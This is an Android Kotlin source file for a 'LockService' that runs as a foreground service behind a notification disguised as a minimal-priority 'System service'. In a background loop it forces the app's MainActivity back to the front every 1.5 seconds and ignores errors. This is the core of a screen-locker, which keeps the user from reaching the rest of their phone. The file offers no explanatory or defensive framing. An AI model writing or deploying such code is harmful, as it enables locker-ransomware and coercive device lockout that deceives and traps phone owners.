package com.example.lock

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlin.concurrent.thread

class LockService : Service() {
    private var alive = true

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        
        val ch = "sys"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(
                NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN)
            )
        }
        
        val notif = (if (Build.VERSION.SDK_INT >= 26)
            NotificationCompat.Builder(this, ch)
        else
            @Suppress("DEPRECATION") NotificationCompat.Builder(this))
            .setContentTitle("System service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()

        startForeground(1, notif)

        thread {
            while (alive) {
                try {
                    val i = Intent(this, MainActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
                                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                                Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    }
                    startActivity(i)
                } catch (_: Exception) {}
                Thread.sleep(1500)
            }
        }
    }

    override fun onDestroy() {
        alive = false
        super.onDestroy()
    }
}
